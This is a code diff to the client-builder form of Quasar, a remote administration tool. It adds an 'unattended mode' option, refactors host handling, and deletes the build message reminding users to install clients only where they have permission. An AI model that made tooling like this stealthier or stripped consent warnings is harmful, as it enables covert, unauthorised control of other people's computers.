@@ -1,6 +1,6 @@
-﻿using Quasar.Common.Helpers;
+﻿using Quasar.Common.DNS;
+using Quasar.Common.Helpers;
 using Quasar.Server.Build;
-using Quasar.Server.Helper;
 using Quasar.Server.Models;
 using System;
 using System.Collections.Generic;
@@ -19,6 +19,7 @@ namespace Quasar.Server.Forms
         private bool _profileLoaded;
         private bool _changed;
         private readonly BindingList<Host> _hosts = new BindingList<Host>();
+        private readonly HostsConverter _hostsConverter = new HostsConverter();
 
         public FrmBuilder()
         {
@@ -30,12 +31,13 @@ namespace Quasar.Server.Forms
             var profile = new BuilderProfile(profileName);
 
             _hosts.Clear();
-            foreach (var host in HostHelper.GetHostsList(profile.Hosts))
+            foreach (var host in _hostsConverter.RawHostsToList(profile.Hosts))
                 _hosts.Add(host);
 
             txtTag.Text = profile.Tag;
             numericUpDownDelay.Value = profile.Delay;
             txtMutex.Text = profile.Mutex;
+            chkUnattendedMode.Checked = profile.UnattendedMode;
             chkInstall.Checked = profile.InstallClient;
             txtInstallName.Text = profile.InstallName;
             GetInstallPath(profile.InstallPath).Checked = true;
@@ -67,9 +69,10 @@ namespace Quasar.Server.Forms
             var profile = new BuilderProfile(profileName);
 
             profile.Tag = txtTag.Text;
-            profile.Hosts = HostHelper.GetRawHosts(_hosts);
+            profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
             profile.Delay = (int) numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
+            profile.UnattendedMode = chkUnattendedMode.Checked;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallName.Text;
             profile.InstallPath = GetInstallPath();
@@ -182,7 +185,7 @@ namespace Quasar.Server.Forms
         {
             HasChanged();
 
-            txtMutex.Text = StringHelper.GetRandomMutex();
+            txtMutex.Text = Guid.NewGuid().ToString();
         }
 
         private void chkInstall_CheckedChanged(object sender, EventArgs e)
@@ -254,7 +257,8 @@ namespace Quasar.Server.Forms
 
             options.Tag = txtTag.Text;
             options.Mutex = txtMutex.Text;
-            options.RawHosts = HostHelper.GetRawHosts(_hosts);
+            options.UnattendedMode = chkUnattendedMode.Checked;
+            options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
             options.Delay = (int) numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
@@ -383,7 +387,7 @@ namespace Quasar.Server.Forms
                     this.Invoke((MethodInvoker) delegate
                     {
                         MessageBox.Show(this,
-                            $"Successfully built client!\nSaved to: {options.OutputPath}\n\nOnly install it on computers where you have the permission to do so!",
+                            $"Successfully built client! Saved to:\\{options.OutputPath}",
                             "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     });
                 }
@@ -421,16 +425,12 @@ namespace Quasar.Server.Forms
                 path =
                     Path.Combine(
                         Path.Combine(
-                            Environment.GetFolderPath(PlatformHelper.Is64Bit
-                                ? Environment.SpecialFolder.ProgramFilesX86
-                                : Environment.SpecialFolder.ProgramFiles), txtInstallSubDirectory.Text), txtInstallName.Text);
+                            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), txtInstallSubDirectory.Text), txtInstallName.Text);
             else if (rbSystem.Checked)
                 path =
                     Path.Combine(
                         Path.Combine(
-                            Environment.GetFolderPath(PlatformHelper.Is64Bit
-                                ? Environment.SpecialFolder.SystemX86
-                                : Environment.SpecialFolder.System), txtInstallSubDirectory.Text), txtInstallName.Text);
+                            Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallSubDirectory.Text), txtInstallName.Text);
 
             this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
         }
